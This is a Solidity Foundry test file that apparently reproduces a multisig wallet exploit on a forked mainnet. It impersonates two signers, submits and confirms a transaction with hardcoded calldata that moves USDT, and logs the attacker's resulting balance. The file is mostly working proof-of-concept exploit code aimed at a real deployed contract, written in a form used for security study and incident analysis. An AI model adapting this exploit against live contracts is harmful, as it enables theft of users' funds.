// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface CheatCodes {
    function prank(address) external;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
}

interface MultiSig {
    function confirmTransaction(uint256 transactionId) external;
    function submitTransaction(
        address destination,
        uint256 value,
        bytes memory data
    ) external returns (uint256 transactionId);
    function getConfirmations(uint256 transactionId)
        external
        view
        returns (address[] memory _confirmations);
    function required() external view returns (uint256);
}

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    MultiSig MultiSigWallet = MultiSig(payable(0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6));

    function testExploit() public {
        emit log_named_uint("number of approval required:", MultiSigWallet.required());
        cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);
        MultiSigWallet.submitTransaction(0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857, 0, hex"fe7f61ea000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000913e1f5a200000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6");
        emit log_named_address("transaction was signed by wallet", MultiSigWallet.getConfirmations(21109)[0]);
        cheat.prank(0x812d8622C6F3c45959439e7ede3C580dA06f8f25);
        MultiSigWallet.confirmTransaction(21109);
        emit log_named_address("transaction was signed by wallet", MultiSigWallet.getConfirmations(21109)[1]);
        emit log_named_uint("USDT balance of attacker", USDT.balanceOf(address(this)));
    }

    receive() external payable{}
}
